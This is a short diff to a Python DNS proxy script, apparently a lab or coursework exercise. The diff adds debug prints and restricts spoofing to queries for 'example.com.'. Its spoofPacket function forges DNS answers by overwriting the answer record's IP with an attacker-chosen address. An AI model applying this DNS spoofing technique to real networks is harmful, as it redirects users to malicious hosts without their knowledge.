@@ -32,8 +32,6 @@ def spoofPacket(packet):
 	#Spoof the packet by overriding the rdata for the IP address we want to spoof
 	#and we do the same for the name server by overriding rdata and rrname
 	#Note: there could be multiple NS, so we need to do this for all of them
-	name = packet[DNSQR].qname
-	print ("Spoofing query: ", name)
 	packet.an[DNSRR].rdata = spoofIP
 	print ("Spoofed Ipv4: ", packet.an)
 
@@ -63,7 +61,11 @@ if __name__ == '__main__':
 		response = sock.recv(4096)
 		response = DNS(response)
 		#spoof the DNS packet if we need to
-		if SPOOF:
+		name = response[DNSQR].qname
+		print("Query name is :", name)
+		print(SPOOF)
+		if (SPOOF and name == 'example.com.'):
+			print("Im here")
 			response = spoofPacket(response)
 		'''
 		print "\n***** Packet Received from Remote Server *****"
